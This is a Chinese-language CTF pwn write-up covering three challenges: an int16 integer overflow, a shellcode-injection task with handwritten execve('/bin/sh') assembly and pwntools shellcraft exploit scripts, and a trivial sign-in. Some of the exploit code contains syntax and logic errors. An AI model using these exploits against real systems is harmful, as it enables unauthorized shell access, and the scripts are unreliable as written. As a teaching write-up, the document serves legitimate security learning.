# 1、INTbug

**难度：[font color="#00FF00"]简单[/font]**

打开ida分析func函数，可见是整数溢出型漏洞

![image.png](http://joker233.top/usr/uploads/2025/09/3468539743.png)

v1是__int16类型，2字节有符号整数，范围在-32768到32767

v2是int类型，4字节有符号整数

v3是canary保护值

每次循环会读取输入到v2，如果是正数，就给v1值＋1，如果不是正数就跳出循环

当v1达到32767时，再加1会整数型溢出，变为-32768

此时++v1＜0条件成立，即可调用到system("cat flag")

exp脚本：

```python
from pwn import *
p=remote("ip",port)

for i in range(32767)
    p.sendline(b'1')

p.sendline(b'1')

p.interactive()
```

# 2、input_function

**难度：[font color="#DC143C"]困难[/font]**

打开ida，分析main函数

![image.png](http://joker233.top/usr/uploads/2025/09/2282380760.png)

发现分配了一块内存，地址为0x114514，大小0x1000，权限7(1+2+4，可读可写**可执行**)，将地址保存在了指针变量buf中

提示输入一个编译后的函数

读取最多**0x500字节**到内存

随后直接执行

可以看出是**注入shellcode执行**

第一种方法，我们手动写一个调用execve("/bin/sh")

```shell
; x86-64 Shellcode
section .text
    global _start

_start:
    ; execve("/bin/sh", 0, 0)
    xor rsi, rsi
    mov rdi, 0x114514 + 0x100  ;
    mov rax, 59
    syscall
```

但pwntools可以自动生成一个shellcode

exp如下：

```python
from pwn import *

context(arch='amd64',os='linux')

shellcode=asm(shellcraft.sh())

p.remote("ip",port)

p.send(shellcode)

p.interactive()
```

# 3、pwn's door

**难度：[font color="#00FF00"]简单[/font]**

![image.png](http://joker233.top/usr/uploads/2025/09/1274416646.png)

很简单的签到题

输出一大堆东西，读取输入到n7038329，然后判断n7038329是否等于7038329

直接运行，输入7038329，就可以拿到flag了
